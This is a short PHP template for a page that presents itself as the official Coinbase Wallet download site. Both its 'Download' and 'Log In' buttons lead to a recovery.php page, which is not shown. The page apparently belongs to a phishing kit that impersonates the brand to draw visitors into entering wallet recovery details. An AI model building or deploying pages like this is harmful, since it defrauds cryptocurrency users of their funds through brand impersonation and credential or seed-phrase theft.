<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Download Coinbase Wallet - Official Website';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-4 p25 px30 text-center mt60">
                    <img src="<?= base_url('assets/img/logo.png') ?>" class="mt60" style="max-height: 260px" alt="...">
                    <div class="fs30 fw-bold">Welcome to</div>
                    <div class="fs30 fw-bold">Coinbase Wallet</div>
                    <div class="text-center mx-auto w-100 d-grid gap-6">
                        <a href="<?= base_url('recovery.php')?>" class="btn bg-white text-balck rounded-pill py15 fs18 my15 fw-bold">Download CoinBase</a>
                        <a href="<?= base_url('recovery.php')?>" class="btn btn-outline-primary text-white border-white rounded-pill py15 fs18 my15 fw-bold">Log In to Coinbase</a>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>